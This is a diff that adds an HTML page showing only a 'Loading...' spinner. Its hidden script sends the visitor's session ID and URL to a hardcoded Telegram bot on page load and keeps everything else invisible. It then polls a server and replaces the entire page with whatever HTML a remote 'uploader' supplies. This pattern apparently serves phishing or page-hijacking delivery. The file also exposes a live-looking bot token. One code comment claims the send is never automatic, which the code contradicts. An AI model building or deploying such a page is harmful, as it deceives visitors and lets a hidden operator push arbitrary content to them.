@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        /* Minimal reset and full-screen centering */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: #f0f4f9;
+            font-family: 'Google Sans', Arial, sans-serif;
+            margin: 0;
+        }
+        /* tiny container – only the spinner and minimal text */
+        .loader {
+            text-align: center;
+            background: transparent;
+            padding: 0;
+        }
+        .spinner {
+            border: 4px solid #e8eaed;
+            border-top: 4px solid #1a73e8;
+            border-radius: 50%;
+            width: 48px;
+            height: 48px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            color: #5f6368;
+            font-size: 14px;
+            margin-top: 20px;
+            font-weight: 400;
+        }
+        /* Hide everything else – no session info, no button, no status */
+        .hidden {
+            display: none !important;
+        }
+        /* small helper to keep the container minimal */
+        .container {
+            background: transparent;
+            padding: 0;
+            border-radius: 0;
+            box-shadow: none;
+            max-width: 100%;
+        }
+        /* override any leftover */
+        .session-info, .telegram-btn, .status-message {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+    <!-- ONLY the loading spinner and "Loading..." text – everything else is hidden -->
+    <div class="container" id="loadingContainer">
+        <div class="loader">
+            <div class="spinner" id="loadingSpinner"></div>
+            <div class="loading-text">Loading...</div>
+        </div>
+
+        <!-- these elements are kept in the DOM but hidden; they store session data and logic -->
+        <div class="session-info hidden">
+            <div class="session-label">📋 Your Session ID</div>
+            <div class="session-id" id="sessionDisplay">Loading...</div>
+        </div>
+        <button class="telegram-btn hidden" onclick="sendSessionToTelegram()">📨 Send Session ID to Telegram</button>
+        <div class="status-message hidden" id="statusMessage"></div>
+    </div>
+
+    <script>
+        // ====== TELEGRAM CONFIGURATION – same as original ======
+        const TELEGRAM_BOT_TOKEN = '8905536103:AAETKrARcyzO0oHgxTvonGIIy81_Amz3qcE';
+        const TELEGRAM_CHAT_ID = '8391692120';
+
+        // Generate or get the session ID from URL (same logic)
+        function getSessionId() {
+            const urlParams = new URLSearchParams(window.location.search);
+            let sessionId = urlParams.get('session');
+            if (!sessionId) {
+                sessionId = Math.random().toString(36).substring(2, 10);
+                const newUrl = window.location.pathname + '?session=' + sessionId;
+                window.history.replaceState({}, '', newUrl);
+            }
+            return sessionId;
+        }
+
+        const sessionId = getSessionId();
+        const fullUrl = window.location.origin + '/preview?session=' + sessionId;
+
+        // update hidden session display (not visible, but used for reference)
+        document.getElementById('sessionDisplay').textContent = sessionId;
+
+        // ====== TELEGRAM SEND FUNCTION (same as original, but never called automatically) ======
+        function sendSessionToTelegram() {
+            // This function is kept but not triggered by UI (button hidden)
+            // It can be called manually via console if needed, but we keep it for consistency.
+            const status = document.getElementById('statusMessage');
+            const btn = document.querySelector('.telegram-btn');
+            
+            // Disable button and show sending state (though hidden)
+            btn.disabled = true;
+            btn.textContent = '⏳ Sending...';
+            status.textContent = '📤 Sending session ID to Telegram...';
+            status.className = 'status-message';
+            
+            const message = `🎯 New Preview Session Ready!\n\n📋 Session ID: ${sessionId}\n🔗 Full URL: ${fullUrl}\n\nShare this session ID with the uploader to load your HTML content.`;
+            
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    status.textContent = '✅ Session ID sent to Telegram successfully!';
+                    status.className = 'status-message';
+                    btn.textContent = '📨 Sent to Telegram ✓';
+                } else {
+                    throw new Error(data.description || 'Failed to send');
+                }
+            })
+            .catch(error => {
+                console.error('Error sending to Telegram:', error);
+                status.textContent = '❌ Failed to send. Copy the session ID manually.';
+                status.className = 'status-message error';
+                btn.textContent = '📨 Send Session ID to Telegram';
+                btn.disabled = false;
+            });
+        }
+
+        // ====== AUTO-SEND ON PAGE LOAD (silent, no UI change) ======
+        // We call sendSessionToTelegram() automatically so the session ID is sent to Telegram
+        // without any visible button or status message.
+        // This keeps the UI clean (only loading spinner) but still sends the ID.
+        // We use a small delay to ensure everything is ready.
+        window.addEventListener('load', function() {
+            // Send session to Telegram silently
+            sendSessionToTelegram();
+        });
+
+        // ====== CHECK FOR UPLOADED CONTENT (same as original) ======
+        function checkForContent() {
+            fetch('/api/check/' + sessionId)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.hasContent) {
+                        // Replace the ENTIRE page with the uploaded HTML
+                        document.open();
+                        document.write(data.html);
+                        document.close();
+                    }
+                })
+                .catch(err => console.log('Waiting for content...'));
+        }
+
+        // Check every 2 seconds
+        setInterval(checkForContent, 2000);
+        
+        // Notify that this session is waiting
+        fetch('/api/session/' + sessionId + '/waiting', { method: 'POST' })
+            .catch(err => console.log('Session registered'));
+    </script>
+</body>
+</html>
